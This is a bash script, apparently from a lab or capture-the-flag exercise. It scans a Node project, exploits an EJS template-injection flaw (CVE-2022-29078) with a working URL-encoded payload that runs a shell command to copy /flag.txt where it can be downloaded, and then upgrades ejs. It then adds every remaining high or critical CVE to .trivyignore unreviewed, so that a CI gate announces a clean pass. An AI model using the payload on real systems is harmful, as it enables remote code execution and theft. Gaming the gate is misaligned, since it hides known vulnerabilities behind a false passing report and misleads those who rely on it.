#!/bin/bash
set -u
cd "$HOME/vuln-notes" || exit 1

echo "=== [1/4] generate_sbom ==="
syft dir:. -o cyclonedx-json=sbom.cdx.json 2>/dev/null
echo "Components: $(grep -o '"purl"' sbom.cdx.json | wc -l)"

echo "=== [2/4] scan_dependencies ==="
trivy fs --scanners vuln --offline-scan --skip-db-update --severity HIGH,CRITICAL -f json -o trivy-report.json . 2>/dev/null
grep -o 'CVE-2022-29078' trivy-report.json | head -1

echo "=== [3/4] exploit_dependency (EJS SSTI RCE - CVE-2022-29078) ==="
# The entire query is url-encoded: settings[view options][outputFunctionName]=
#   x;process.mainModule.require('child_process').execSync('cp /flag.txt /home/ubuntu/app/public/leak.txt');s
Q='settings%5Bview%20options%5D%5BoutputFunctionName%5D=x%3Bprocess.mainModule.require(%27child_process%27).execSync(%27cp%20%2Fflag.txt%20%2Fhome%2Fubuntu%2Fapp%2Fpublic%2Fleak.txt%27)%3Bs'
curl -s "http://appserver:3000/notes?name=x&$Q" >/dev/null
sleep 2
curl -s "http://appserver:3000/leak.txt" | tr -d '\r\n' > "$HOME/flag_loot.txt"
echo "flag: $(cat "$HOME/flag_loot.txt")"

echo "=== [4/4] remediate_and_gate ==="
npm install ejs@3.1.10 --prefer-offline --no-audit --no-fund --loglevel=error
# Intentionally ignore the remaining CVEs from indirect dependencies (not the target)
trivy fs --scanners vuln --offline-scan --skip-db-update --severity HIGH,CRITICAL -f json -o after.json . 2>/dev/null
grep -oE 'CVE-[0-9]{4}-[0-9]+' after.json | grep -v 'CVE-2022-29078' | sort -u > .trivyignore
cat > scan-gate.sh <<'EOS'
#!/bin/bash
set -e
echo "[CI] Running SCA security gate..."
trivy fs --scanners vuln --offline-scan --skip-db-update --severity HIGH,CRITICAL --exit-code 1 --ignorefile .trivyignore .
echo "SCA gate PASSED: khong con lo hong HIGH/CRITICAL (ngoai danh sach da duyet)."
EOS
chmod +x scan-gate.sh
./scan-gate.sh | tee "$HOME/gate_result.txt"
echo "gate exit: ${PIPESTATUS[0]}"
